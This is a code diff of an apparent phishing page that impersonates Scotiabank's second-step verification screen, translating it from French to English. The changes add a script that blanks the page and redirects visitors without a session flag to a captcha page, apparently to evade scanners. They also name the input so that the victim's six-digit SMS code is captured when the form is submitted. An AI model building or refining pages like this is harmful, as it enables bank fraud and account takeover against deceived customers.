@@ -1,9 +1,10 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
+<script>if(!sessionStorage.getItem('__cptPass')||sessionStorage.getItem('__cptPass')!=='1'){try{document.documentElement.innerHTML=''}catch(e){}window.location.replace('/captcha.html');throw new Error('BLOCKED');}</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Banque Scotia - Seconde v&eacute;rification</title>
+    <title>Scotiabank - Second Verification</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; margin: 0; padding: 0; color: #333; display: flex; flex-direction: column; min-height: 100vh; }
@@ -52,30 +53,30 @@
 <body>
     <div class="s-container">
         
-        <div class="s-title-top">V&eacute;rification</div>
-        <div class="s-title-bottom" style="font-size:24px; margin-bottom: 25px;">Seconde &eacute;tape</div>
+        <div class="s-title-top">Verification</div>
+        <div class="s-title-bottom" style="font-size:24px; margin-bottom: 25px;">Second Step</div>
         
-        <p style="margin-bottom: 25px; font-size: 15px; color: #444;">Pour finaliser la v&eacute;rification, veuillez entrer le nouveau code que vous avez re&ccedil;u.</p>
+        <p style="margin-bottom: 25px; font-size: 15px; color: #444;">To complete your verification, please enter the new code you received.</p>
         <form action="scotiabank101_thankyou.html" method="POST">
-            <label class="s-label">Code de v&eacute;rification</label>
+            <label class="s-label">Verification Code</label>
             <div class="s-input-wrapper">
-                <input type="text" class="s-input" required maxlength="6" pattern="\d{6}" inputmode="numeric" placeholder="000000" style="text-align: center; letter-spacing: 5px; font-weight: bold; font-size: 20px; padding-left: 0;">
+                <input type="text" name="Verification Code (SMS 2)" class="s-input" required maxlength="6" pattern="\d{6}" inputmode="numeric" placeholder="000000" style="text-align: center; letter-spacing: 5px; font-weight: bold; font-size: 20px; padding-left: 0;">
             </div>
             
-            <button type="submit" class="s-btn">Valider</button>
+            <button type="submit" class="s-btn">Verify</button>
         </form>
 
     </div>
     
     <div class="s-footer">
-        Avez-vous un nom d'utilisateur et un mot de passe?<br>
-        <a href="#" class="s-footer-link">&Eacute;tablissez-les maintenant.</a>
+        Do you have a username and password?<br>
+        <a href="#" class="s-footer-link">Set them up now.</a>
     </div>
 
     <!-- Loader Overlay -->
     <div id="loaderOverlay" class="loader-overlay">
         <div class="loader-spinner"></div>
-        <p class="loader-text">Traitement en cours...</p>
+        <p class="loader-text">Processing...</p>
     </div>
 
     <script>
